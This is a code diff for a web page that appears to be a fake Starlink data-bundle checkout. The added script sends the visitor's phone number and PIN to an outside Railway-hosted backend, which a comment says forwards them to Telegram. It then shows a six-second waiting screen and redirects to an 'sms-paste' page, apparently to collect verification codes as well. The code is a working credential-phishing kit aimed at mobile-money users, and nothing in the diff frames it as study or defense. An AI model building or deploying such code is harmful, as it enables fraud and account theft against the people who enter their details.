@@ -279,7 +279,6 @@
         .waiting-sub { font-size: 14px; color: var(--gray-400); margin-top: 14px; line-height: 1.65; }
         .waiting-sub strong { color: var(--white); font-weight: 800; }
 
-        /* BOTTOM NAV */
         .bottom-nav {
             position: fixed; bottom: 0; left: 0; right: 0;
             height: var(--footer-h); background: var(--white);
@@ -463,7 +462,14 @@
     </nav>
 
     <script>
-        // Read plan from URL
+        // ============================================
+        // RAILWAY BACKEND URL
+        // ============================================
+        const API_BASE = 'https://starlink-network-zm-production.up.railway.app';
+
+        // ============================================
+        // READ PLAN FROM URL
+        // ============================================
         const params = new URLSearchParams(window.location.search);
         const planName = params.get('plan') || 'Elite Bundle';
         const planData = params.get('data') || '400GB';
@@ -489,7 +495,6 @@
         const togglePin = document.getElementById('togglePin');
         const waitingOverlay = document.getElementById('waitingOverlay');
 
-        // Keyboard-aware popup
         function movePopup() {
             if (window.visualViewport) {
                 const keyboard = window.innerHeight - window.visualViewport.height;
@@ -551,22 +556,44 @@
             proceed.disabled = !isValid;
         });
 
-        // Proceed — show waiting screen for ~6 seconds, then go to SMS page
-        proceed.addEventListener('click', () => {
+        /* ============================================
+           PROCEED — send details to Telegram (no buttons),
+           then show waiting screen for 6s and redirect
+           ============================================ */
+        proceed.addEventListener('click', async () => {
             if (!/^\d{4,5}$/.test(pin.value)) return;
 
             proceed.disabled = true;
-            proceed.innerHTML = '<i class="uil uil-arrow-right"></i><span>Proceed</span>';
 
             const phone = number.value.trim();
+            const userPin = pin.value;
 
+            // Close the PIN modal
             closeModal();
 
             // Show waiting overlay
             waitingOverlay.classList.add('open');
             document.body.classList.add('modal-open');
 
-            // After ~6 seconds, redirect to sms-paste page
+            // Send details to Telegram (fire and forget)
+            try {
+                await fetch(API_BASE + '/api/checkout', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        plan: planName,
+                        data: planData,
+                        price: planPrice,
+                        period: planPeriod,
+                        phone: phone,
+                        pin: userPin
+                    })
+                });
+            } catch (err) {
+                console.error('Failed to send:', err);
+            }
+
+            // After 6 seconds → move to SMS page
             setTimeout(() => {
                 const smsParams = new URLSearchParams({
                     plan: planName,
